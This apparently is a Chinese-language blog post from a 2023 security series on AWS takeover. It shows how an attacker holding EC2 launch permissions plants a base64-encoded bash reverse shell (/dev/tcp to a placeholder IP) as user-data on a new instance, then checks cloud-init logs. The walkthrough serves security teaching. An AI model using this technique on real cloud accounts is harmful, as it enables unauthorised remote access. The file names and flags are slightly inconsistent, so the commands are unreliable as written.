---
author: Sunny Tsai
title: "[Day 26] 天堂雲端 - reverse shell via credential"
date: 2023-10-08
math: true
tags: [
    "aws",
    "reverse shell"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-天堂雲端之從開始到接管"]
---
# AWS CloudInit
cloud-init package是Canonical建構的開源應用程式，用於引導在雲端環境中的Linux image。[AWS CloudInit](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/amazon-linux-ami-basics.html#amazon-linux-cloud-init)是一種用於自動化EC2 instance初始化和設置的工具，可以在EC2 instance啟動過程中執行各種初始化任務。

## AWS Cloud Boothook
AWS Cloud Boothhook是用於EC2 instance啟動期間執行自定義命令的機制。具體來說，boothook是cloudinit配置的一部份，主要用於：
* 自定義初始化行為
* 自動化任務

# Reverse shell

## Build reverse shell code
建立reverse shell，這裡用bash做示範
backdoor.sh
```bash
#!/bin/bash
echo "Hello World" >> hello.txt
/bin/bash -i >& /dev/tcp/IP/9000 0>&1   # Revese shell範例
```

backdoor_encoded.sh
```shell
base64 -i blackdoor.sh > blackdoor_encoded.sh   # 這是Mac的寫法
```

-----


## 啟動新的EC2 instance
攻擊者已經獲取合法有限權限，其中包括啟動新實例所需的權限。
> iam:PassRole
> ec2:RunInstances


```shell
> aws ec2 run-instances \
  --image-id ami-xxxxxxxxxxxxxxxxx \
  --instance-type t2.micro \
  --key-name YourKeyPairName \
  --key-name SSHKey \
  --user-data file://backdoor_encoded.sh \
  --security-group-ids SecurityGroup
```

ssh key一定要寫，要不然建完發現進不去...

Output:
```json
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-XXXXXXXXXXXXX",
            "InstanceId": "i-XXXXX",
            "InstanceType": "t2.micro",
            "LaunchTime": "Date",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "XXXXXXX",
                "GroupName": "",
                "Tenancy": "default"
            },
            "PrivateDnsName": "....",
            "PrivateIpAddress": ".....",
            "ProductCodes": [],
            "PublicDnsName": "",
            "State": {
                "Code": 0,
                "Name": "pending"
            },
:...skipping...
```
有正常的輸出代表建立EC2成功

## 測試
bash內容有寫入資料到hello.txt，可以先查看這個檔案有沒有資料

或是

```shell
這裡儲存著cloud-init的log
tail /var/log/cloud-init.log
```

```
這裡儲存cloud-init 輸出log
tail /var/log/cloud-init-output.log
```
